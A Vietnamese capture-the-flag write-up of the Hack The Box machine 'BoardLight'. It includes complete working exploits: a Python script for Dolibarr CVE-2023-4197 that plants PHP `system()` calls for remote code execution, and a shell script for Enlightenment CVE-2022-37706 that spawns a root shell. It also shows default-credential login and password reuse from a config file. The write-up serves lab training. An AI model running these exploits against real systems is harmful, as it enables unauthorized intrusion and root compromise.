---
title: "BoardLight"
date: 2024-05-26 20:26:10 +0700
categories: [hackthebox]
tags: [hackthebox, web]
authors: [toan]
toc: true
---

## Introduction
Bài tương đối dễ của sesson 5, mới mở ngày 25/05/2024

## Recons
Dùng nmap scanner tool, port opens: `80, 22`. Check web trên port 80 không có gì đặc biệt. Sau khi vô tình thấy board.htb tại footer, tôi tiến hành enum vhost. có 1 miền đc scan tên là `crm.board.htb`.

## User flag
Tìm các CVE liên quan đến Vendor đang chạy trên `crm` (Dolibarr). Trước tiên server có thể đăng nhập qua default creds là `admin:admin`. Sau đó xem các CVE liên quan đến version đang chạy `Dolibarr 17.0.1`. TÔi thấy [CVE-2023-4197](https://starlabs.sg/advisories/23/23-4197/) là liên quan nhất cụ thể thuộc về CWE `CWE-20: Improper Input Validation`. Đoạn code trong bài ko chạy đc. Tôi đã tìm được đoạn code trên github đã chỉnh sửa để chạy được.
```python
# Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197)
# Via: https://TARGET_HOST/website/index.php
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)

#!/usr/bin/env python3
import os
import re
import requests
import sys
import uuid
requests.packages.urllib3.disable_warnings()

s = requests.Session()

def check_args():
    global target, username, password, cmd

    print("\n===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====\n")

    if len(sys.argv) != 5:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE".format(sys.argv[0]))
        sys.exit(1)

    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = sys.argv[4]

def authenticate():
    global s, csrf_token

    print("[+] Attempting to authenticate...")

    # GET the CSRF token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()

    # Login
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)

    if "Logout" not in res.text:
        print("[!] Authentication failed! Are the credentials valid?")
        sys.exit(1)
    else:
        print("[+] Authenticated successfully!")

def rce():
    # Create web site
    print("[+] Attempting to create a website...")
    website_name = uuid.uuid4().hex
    data = {
        "WEBSITE_REF": website_name,
        "token": csrf_token,
        "action": "addsite",
        "WEBSITE_LANG": "en",
        "addcontainer": "create"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Website - {website_name}" not in res.text:
        print("[!] Website creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created website name: \"{website_name}\"!")

    # Create web page
    print("[+] Attempting to create a web page...")
    webpage_name = uuid.uuid4().hex
    data = {
        "website": website_name,
        "token": csrf_token,
        "action": "addcontainer",
        "WEBSITE_TYPE_CONTAINER": "page",
        "WEBSITE_TITLE": "x",
        "WEBSITE_PAGENAME": webpage_name
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Contenair \\'{webpage_name}\\' added" not in res.text:
        print("[!] Web page creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created web page name: \"{webpage_name}\"!")

    # Modify created page
    print("[+] Attempting to modify the web page...")
    webpage_id = re.search(f"<option value=\"(.+)\" .+{webpage_name}", res.text).group(1).strip()
    data = {
        "website": website_name,
        "WEBSITE_PAGENAME": webpage_name,
        "pageid": webpage_id,
        "token": csrf_token,
        "action": "updatemeta",
        "htmlheader": f"<?PHP echo system('{cmd}'); ?>"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if "Saved" not in res.text:
        print("[!] Web page modification failed!")
        sys.exit(1)
    else:
        print("[+] Web page modified successfully!")

    # Trigger RCE
    print(f"[+] Triggering RCE now via: {target}/public/website/index.php?website={website_name}&pageref={webpage_name}")
    res = s.get(f"{target}/public/website/index.php?website={website_name}&pageref={webpage_name}", verify=False)
    if res.status_code != 200:
        print("[!] Web page is not reachable!")
        sys.exit(1)
    else:
        output = re.findall("block -->\n(.+)</head>", res.text, re.MULTILINE | re.DOTALL)[0].strip()
        print(f"[+] RCE successful! Output of command:\n\n{output}")

def main():
    check_args()
    authenticate()
    rce()

if __name__ == "__main__":
    main()
```
Các bạn có thể đọc lại để check thay đổi (không nhiều vẫn theo nội dung của PoC trong bài phân tích). bạn có thể chạy tử và thực thi code, tôi đã tim đc trên server có user tên là `larissa`, mở file config để tìm pass db thử. `/var/www/html/crm.board.htb/htdocs/conf/conf.php` tìm đc creds của user `larissa:ser<------->023!!` <br>
Login ssh bằng creds trên và get user flag.

## Root flag
Check sticky bit tìm file có sticky bit và search mạng thử cách crack, tôi đã check bằng linpeas và thử vs CVE exploit `DirtyPies` nhưng không đc (có yêu cầu xác thực) chắc đã prevent rồi. [Link CVE-2022-37706](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-37706), [Link Code](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
![image.png](https://i.postimg.cc/qv0Wq1B6/image.png)
![image.png](https://i.postimg.cc/CxNXqbdP/image.png)
```shell
larissa@boardlight:~$ cat exploit.sh
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```
lên Root rồi lấy flag thôi. Cảm ơn đã xem. `good luck!`
